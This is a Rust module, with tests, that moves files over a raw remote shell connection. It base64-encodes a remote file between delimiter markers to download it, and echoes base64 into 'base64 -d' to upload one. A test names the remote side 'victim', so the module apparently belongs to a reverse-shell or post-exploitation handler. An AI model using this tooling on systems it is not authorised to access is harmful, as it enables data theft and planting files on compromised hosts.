use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};

use crate::util::{base64_decode, base64_encode, find_slice};

const DELIM_START: &[u8] = b"SHSTRT";
const DELIM_END: &[u8] = b"SHEEND";

/// Download a remote file to the local filesystem.
pub async fn download<R: AsyncRead + Unpin, W: AsyncWrite + Unpin>(
    reader: &mut R,
    writer: &mut W,
    remote_path: &str,
    local_path: &str,
) -> Result<(), anyhow::Error> {
    let escaped = remote_path.replace('\'', "'\\''");
    let cmd = format!(
        "echo '{s}'; base64 -w0 '{e}' 2>/dev/null; echo; echo '{d}'",
        s = String::from_utf8_lossy(DELIM_START),
        e = escaped,
        d = String::from_utf8_lossy(DELIM_END),
    );

    writer.write_all(cmd.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.flush().await?;

    let mut content = Vec::new();
    let mut state = 0;
    let mut buf = vec![0u8; 65536];

    while state < 2 {
        let n = reader.read(&mut buf).await?;
        if n == 0 {
            anyhow::bail!("connection closed during download");
        }
        let chunk = &buf[..n];

        if state == 0 {
            if let Some(pos) = find_slice(chunk, DELIM_START) {
                state = 1;
                let after = &chunk[pos + DELIM_START.len()..];
                if let Some(end) = find_slice(after, DELIM_END) {
                    content.extend_from_slice(&after[..end]);
                    state = 2;
                } else {
                    content.extend_from_slice(after);
                }
            }
        } else if let Some(pos) = find_slice(chunk, DELIM_END) {
            content.extend_from_slice(&chunk[..pos]);
            state = 2;
        } else {
            content.extend_from_slice(chunk);
        }
    }

    let b64: String = String::from_utf8(content)?
        .trim()
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect();

    let decoded = base64_decode(&b64)
        .ok_or_else(|| anyhow::anyhow!("invalid base64 content from remote"))?;

    tokio::fs::write(local_path, decoded).await?;
    Ok(())
}

/// Upload a local file to the remote system via base64.
pub async fn upload<W: AsyncWrite + Unpin>(
    writer: &mut W,
    local_path: &str,
    remote_path: &str,
) -> Result<(), anyhow::Error> {
    let data = tokio::fs::read(local_path).await?;
    let b64 = base64_encode(&data);
    let escaped = remote_path.replace('\'', "'\\''");
    let cmd = format!("echo '{}' | base64 -d > '{}'", b64, escaped);

    writer.write_all(cmd.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.flush().await?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::io::duplex;

    #[tokio::test]
    async fn upload_sends_base64_command() {
        let (client, _server) = duplex(4096);
        let (client_r, client_w) = tokio::io::split(client);
        let mut client_w = client_w;

        let tmp = tempfile::NamedTempFile::new().unwrap();
        tokio::fs::write(tmp.path(), b"hello upload").await.unwrap();

        upload(&mut client_w, tmp.path().to_str().unwrap(), "/remote/path")
            .await
            .unwrap();
        let _ = client_r;
    }

    #[tokio::test]
    async fn download_parses_delimiters() {
        let (client, mut server) = duplex(65536);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        tokio::spawn(async move {
            let mut buf = vec![0u8; 65536];
            let n = server.read(&mut buf).await.unwrap();
            let _cmd = String::from_utf8_lossy(&buf[..n]);
            let b64 = base64_encode(b"hello from victim");
            let resp = format!("leading output\nSHSTRT{}\nSHEEND\ntrailing", b64);
            server.write_all(resp.as_bytes()).await.unwrap();
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        download(&mut client_r, &mut client_w, "/remote/path", tmp.path().to_str().unwrap())
            .await
            .unwrap();

        let content = tokio::fs::read(tmp.path()).await.unwrap();
        assert_eq!(content, b"hello from victim");
    }

    #[tokio::test]
    async fn download_empty_file() {
        let (client, mut server) = duplex(65536);
        let (mut client_r, mut client_w) = tokio::io::split(client);

        tokio::spawn(async move {
            let mut buf = vec![0u8; 65536];
            let n = server.read(&mut buf).await.unwrap();
            let _cmd = String::from_utf8_lossy(&buf[..n]);
            let resp = "SHSTRTSHEEND";
            server.write_all(resp.as_bytes()).await.unwrap();
        });

        let tmp = tempfile::NamedTempFile::new().unwrap();
        download(&mut client_r, &mut client_w, "/remote/path", tmp.path().to_str().unwrap())
            .await
            .unwrap();

        let content = tokio::fs::read(tmp.path()).await.unwrap();
        assert_eq!(content, b"");
    }
}
